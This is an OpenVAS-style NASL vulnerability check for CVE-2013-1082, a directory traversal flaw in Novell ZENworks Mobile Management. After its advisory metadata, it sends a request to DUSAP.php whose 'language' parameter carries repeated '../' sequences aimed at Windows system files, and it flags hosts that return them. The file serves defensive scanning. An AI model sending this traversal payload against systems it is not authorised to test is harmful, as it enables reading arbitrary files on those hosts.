CPE = "cpe:/a:novell:zenworks_mobile_management";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803811" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-1082" );
	script_bugtraq_id( 60179 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-14 11:06:05 +0530 (Fri, 14 Jun 2013)" );
	script_name( "Novell ZENworks Mobile Management Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52545" );
	script_xref( name: "URL", value: "http://securitytracker.com/id?1028265" );
	script_xref( name: "URL", value: "http://www.novell.com/support/kb/doc.php?id=7011896" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_novell_zenworks_mobile_management_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "zenworks_mobile_management/installed", "Host/runs_windows" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will let the attackers to disclose the contents
  of any file on the system via directory traversal sequences." );
	script_tag( name: "affected", value: "Novell ZENworks Mobile Management version before 2.7.1" );
	script_tag( name: "insight", value: "Input passed via the 'language' parameter to DUSAP.php is not properly
  verified before being used to include files." );
	script_tag( name: "solution", value: "Upgrade to version 2.7.1 or later." );
	script_tag( name: "summary", value: "The host is installed with Novell ZENworks Mobile Management is
  prone to directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = "/DUSAP.php?language=res/languages/" + crap( data: "../", length: 6 * 9 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}

